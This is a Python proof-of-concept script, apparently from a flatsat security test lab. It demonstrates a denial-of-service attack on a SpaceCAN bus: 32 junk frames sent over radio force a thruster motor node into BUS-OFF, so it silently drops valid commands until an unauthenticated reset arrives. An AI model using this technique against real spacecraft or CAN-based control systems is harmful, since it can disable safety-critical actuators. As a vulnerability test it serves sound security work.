#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs

def main(dev, ev):
    # V0-13: SpaceCAN has no source authentication. Malformed frames raise
    # the TEC error counter (+8 each): 32 junk frames silence the motor
    # node into BUS-OFF, and the node then ignores even valid traffic.
    dev.tc(0x04, bytes([0, 0]), via="usb")               # t0 power baseline 0
    st = dev.find(dev.tc(0x0C, b"", via="usb"), 0x0C)[0]
    check(st.u8(5) == 0, "t0 baseline must be 0")

    junk = bytes([0]) + (0x284).to_bytes(4, "big") + bytes([1, 0x99])
    for i in range(32):
        dev.tc(0x1C, junk, via="radio")
    valid = bytes([0]) + (0x284).to_bytes(4, "big") + bytes([2, 0x01, 100])
    r = dev.find(dev.tc(0x1C, valid, via="radio"), 0x1C)[0]
    ev.log(f"busoff mask=0x{r.u8(3):02X} err_count={r.u8(5) | (r.u8(6) << 8)}")
    check(r.u8(3) & 1, "motor node must be BUS-OFF after the junk storm")

    st = dev.find(dev.tc(0x0C, b"", via="usb"), 0x0C)[0]
    ev.log(f"thruster power after 'valid' frame while BUS-OFF: t0={st.u8(5)}")
    check(st.u8(5) == 0, "BUS-OFF node must not act commands (silent kill)")

    # the only escape is an explicit node-reset (also unauthenticated)
    reset = bytes([3]) + (0x284).to_bytes(4, "big") + bytes([0])
    r = dev.find(dev.tc(0x1C, reset, via="radio"), 0x1C)[0]
    check(not (r.u8(3) & 1), "node back after reset cmd")
    dev.tc(0x1C, valid, via="radio")
    st = dev.find(dev.tc(0x0C, b"", via="usb"), 0x0C)[0]
    ev.log(f"thruster power after recovery: t0={st.u8(5)}")
    check(st.u8(5) == 100, "node acts again once cleared")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V0-13 SpaceCAN bus-off DoS (no frame auth)", main))
